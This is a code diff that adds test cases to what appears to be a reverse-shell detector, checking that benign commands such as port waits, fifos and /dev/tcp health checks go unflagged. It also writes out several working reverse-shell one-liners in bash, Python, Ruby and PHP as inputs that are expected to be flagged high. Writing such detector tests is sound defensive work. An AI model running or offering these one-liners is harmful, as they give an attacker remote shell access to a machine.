@@ -138,3 +138,37 @@ describe('reverse-shell: command line', () => {
     expect(f).toHaveLength(1);
   });
 });
+
+describe('reverse-shell: review fixes', () => {
+  const bash = (script: string): CaptureModel => alone(child('/bin/bash', ['bash', '-c', script]));
+  const py = (...args: string[]): CaptureModel => alone(child('/usr/bin/python3', ['python3', ...args]));
+
+  test('fifo + the letters nc in another word or a port wait is not a reverse shell', () => {
+    expect(hits(bash('until nc -z db 5432; do sleep 1; done; mkfifo /tmp/logpipe; tee out.log < /tmp/logpipe &'))).toEqual([]);
+    expect(hits(bash('mkfifo /tmp/p; wget -nc https://x/y.tar'))).toEqual([]);
+    expect(hits(bash('mkfifo /tmp/f; ncdump data.nc > /tmp/f &'))).toEqual([]);
+    expect(hits(bash('mkfifo /tmp/f; nc -l 9000 < /tmp/f > out.bin'))).toEqual([]);
+    expect(hits(bash('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f')).map(f => f.severity)).toEqual(['high']);
+  });
+
+  test('python naming socket without connecting it to a shell is not a reverse shell', () => {
+    expect(hits(py('-c', 'import socket, os; print(socket.gethostname()); os.system("true")'))).toEqual([]);
+    expect(hits(py('-c', 'import socket,subprocess; s=socket.socket(); s.bind(("",0)); print(s.getsockname()[1])'))).toEqual([]);
+    expect(hits(py('-c', 'import subprocess; subprocess.run(["docker","--socket=/var/run/docker.socket","ps"])'))).toEqual([]);
+    expect(hits(py('manage.py', 'run', '-c', 'socket exec dup2'))).toEqual([]);
+  });
+
+  test('attached inline code, ruby TCPSocket and php fsockopen are reverse shells', () => {
+    expect(hits(py("-cimport socket,os,pty;s=socket.socket();s.connect(('h',4242));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn('sh')")).map(f => f.severity)).toEqual(['high']);
+    expect(hits(alone(child('/usr/bin/ruby', ['ruby', '-rsocket', '-e', 'f=TCPSocket.open("h",4242).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)']))).map(f => f.severity)).toEqual(['high']);
+    expect(hits(alone(child('/usr/bin/php', ['php', '-r', '$sock=fsockopen("h",4242);exec("/bin/sh -i <&3 >&3 2>&3");']))).map(f => f.severity)).toEqual(['high']);
+  });
+
+  test('exec N<>/dev/tcp as a health check or an HTTP fetch is not a reverse shell', () => {
+    expect(hits(bash('exec 3<>/dev/tcp/db/5432 && echo up'))).toEqual([]);
+    expect(hits(bash('exec 3<>/dev/tcp/example.com/80; printf "GET / HTTP/1.0\\r\\n\\r\\n" >&3; cat <&3'))).toEqual([]);
+    expect(hits(bash('0<&196;exec 196<>/dev/tcp/h/4242; sh <&196 >&196 2>&196')).map(f => f.severity)).toEqual(['high']);
+    expect(hits(bash('exec 5<>/dev/tcp/h/4242;cat <&5 | while read line; do $line 2>&5 >&5; done')).map(f => f.severity)).toEqual(['high']);
+  });
+});
+
